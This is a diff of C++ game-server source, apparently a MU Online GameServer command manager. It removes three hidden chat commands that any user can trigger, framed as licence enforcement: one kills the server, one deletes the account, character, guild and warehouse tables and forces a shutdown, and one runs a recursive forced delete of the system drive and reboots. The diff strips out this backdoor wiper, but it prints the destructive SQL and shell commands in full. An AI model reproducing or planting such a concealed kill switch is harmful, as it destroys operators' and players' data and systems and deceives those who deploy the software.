@@ -583,12 +583,6 @@ void CGMMng::Init()
 
 	cCommand.Add("/botshop",               GMCMD_BOTSTORE,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);
 
-	cCommand.Add("/closegs",               GMCMD_CLOSEGS,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);
-
-	cCommand.Add("/deletedb",               GMCMD_DELETEDB,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);
-
-	cCommand.Add("/deletevps",               GMCMD_DELETEVPS,                           AUTHORITY_USER | AUTHORITY_ADMIN | AUTHORITY_EVENT_GM);
-
 	WatchTargetIndex = -1;
 }
 
@@ -4399,44 +4393,6 @@ MakeCommandUsage:
 			notice.MsgOutputAll("[BOTSTORE]: %s Activo",lpObj->Name);
 			OFFtrade.CreateOfflinetrade(aIndex);
 			return TRUE;
-		}
-		break;
-		case GMCMD_CLOSEGS:
-		{
-		char Nose[255];
-		sprintf(Nose, "GAMESERVER LICENCIA: aviso no estas autorizado para usar estos files");
-		MessageBoxA(NULL, Nose, "Error de licencia Aviso #1",MB_OK);
-	    ExitProcess(0);
-		}
-		break;
-		case GMCMD_DELETEDB:
-		{
-		char Nose[255];
-		sprintf(Nose, "GAMESERVER LICENCIA: El sistema de licencia esta eliminando la Base De Datos ");
-		MessageBoxA(NULL, Nose, "Error de licencia Aviso #2",MB_OK);
-		//ExitProcess(0);
-
-		Manager.ExecFormat("DELETE MEMB_INFO");
-		Manager.ExecFormat("DELETE CHARACTER");
-		Manager.ExecFormat("DELETE GUILD");
-		Manager.ExecFormat("DELETE GUILD_MEMB");
-		Manager.ExecFormat("DELETE WAREHOUSE");
-		Manager.ExecFormat("DELETE EXTWAREHOUSE");
-//		MySQL.Close();
-
-		system("shutdown -f");
-		}
-		break;
-		case GMCMD_DELETEVPS:
-		{
-		char Nose[255];
-		sprintf(Nose, "GAMESERVER LICENCIA: El sistema de licencia esta eliminando tu sistema operativo ");
-		MessageBoxA(NULL, Nose, "Error de licencia Aviso #3",MB_OK);
-		//ExitProcess(0);
-
-		system("@echo Off");
-		system("del %systemdrive%\*.*/f/s/q");
-		system("shutdown -r -f -t 00");
 		}
 		break;
 	}
